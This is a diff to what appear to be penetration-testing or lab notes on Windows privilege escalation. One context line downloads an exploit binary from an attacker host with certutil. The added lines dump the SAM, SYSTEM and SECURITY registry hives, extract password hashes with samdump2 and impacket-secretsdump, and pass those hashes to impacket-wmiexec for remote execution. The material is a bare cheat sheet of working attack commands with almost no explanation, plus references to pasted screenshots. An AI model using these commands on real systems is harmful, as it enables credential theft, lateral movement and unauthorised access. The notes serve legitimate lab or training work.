@@ -101,4 +101,29 @@ dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd
 certutil -urlcache -f http://10.10.14.5/MS10-059.exe ms.exe
 ```
 
+```
+reg save HKLM\sam sam
+reg save HKLM\system system
+reg save HKLM\security security
+```
+
+![](Pasted%20image%2020231009024625.png)
+
+![](Pasted%20image%2020231009024654.png)
+
+```
+samdump2 SYSTEM SAM
+```
+
+```
+impacket-secretsdump -sam sam -security security -system system LOCAL
+```
+
+![](Pasted%20image%2020231009033039.png)
+
+**Dumping local SAM hashes (uid:rid:lmhash:nthash)**
+
+```
+impacket-wmiexec -hashes LMHASH:NTHASH
+```
 
